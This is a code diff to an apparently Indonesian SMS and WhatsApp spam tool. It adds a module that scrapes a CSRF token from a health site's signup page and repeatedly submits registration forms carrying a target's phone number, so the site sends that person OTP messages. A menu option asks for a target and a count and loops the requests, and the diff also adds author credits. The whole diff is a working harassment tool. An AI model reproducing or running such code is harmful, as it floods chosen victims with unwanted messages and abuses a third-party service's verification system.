@@ -132,6 +132,47 @@ class Kios:
 		else:
 			print (j.text)
 
+class KlikDok:
+	def __init__(self, target):
+		self.s = requests.Session()
+		self.url_get1 = "https://m.klikdokter.com/users/create"
+		self.url_post1 = "https://m.klikdokter.com/users/check"
+		tok = self.getToken()
+#		print ("TOKEN: "+tok)
+		self.data={
+			'_token':tok,
+			'full_name':'BambangSubianto',
+			'email':'Hsjakaj@jskaka.com',
+			'phone':target,
+			'back-to':'',
+			'submit':'Daftar',
+		}
+		self.hulu={
+			'Connection': 'keep-alive',
+			'Cache-Control': 'max-age=0',
+			'Origin': 'https://m.klikdokter.com',
+			'Upgrade-Insecure-Requests': '1',
+			'Content-Type': 'application/x-www-form-urlencoded',
+			'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
+			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+			'Referer': 'https://m.klikdokter.com/users/create?back-to=',
+		}
+
+	def getToken(self):
+		r = self.s.get(self.url_get1)
+		b = bs(r.text, "html.parser")
+		for a in b.findAll("input"):
+			if "_token" == a.get("name"):
+				return a.get("value")
+
+	def spam(self):
+		r = self.s.post(self.url_post1, data=self.data, headers=self.hulu)
+#		print (r.url)
+		if "sessions/auth?user=" in r.url:
+			print ("{}[{}OK{}] Success {}".format(C, G, C, N))
+		else:
+			print ("{}[{}FL{}] Failed{}".format(C, R, C, N))
+
 def banner():
 	print ("""{}
    (          )              )  
@@ -149,6 +190,8 @@ def main():
 	print ("{}   [{}2{}].Spam WhatsApp {}(RUPA-RUPA)".format(W,L,W,B))
 	print ("{}   [{}3{}].Spam SMS {}(kioson)".format(W,L,W,B))
 	print ("{}   [{}4{}].Spam SMS {}(fave)".format(W,L,W,B))
+	print ("{}   [{}5{}].Spam SMS {}(KlikDok)".format(W,L,W,B))
+	print ("{}   [{}0{}].About".format(W,R,W))
 	try:
 		p = input("\n{}[{}CHOICE{}]: {}".format(L,B,L,G))
 		if p == "1" or p == "01":
@@ -179,7 +222,21 @@ def main():
 			for a in range(1, jml):
 				s.spam()
 				time.sleep(2)
-
+		elif p == "5" or p == "05":
+#                        warning("Please use +628xxxx")
+			no = input("{}TARGET: {}".format(C, G))
+			jml = int(input("{}TOTAL: {}".format(C, G)))
+			for a in range(1, jml):
+				KlikDok(no).spam()
+				time.sleep(2)
+		elif p == "0" or p == "00":
+			print ("""
+{}Author{}: {}BILLAL FAUZAN
+{}Version{}: {}0.2
+{}Thanks To{}: {}ALLAH SWT{},
+{}         : {}github.com/KANG-NEWBIE{},
+{}         : {}github.com/ridhoNoob{}
+""".format(L, R, G, L, R, G, L, R, G, C, R, G, C, R, G, N))
 	except ValueError:
 		print ("{}[ERROR]> please input number".format(R))
 
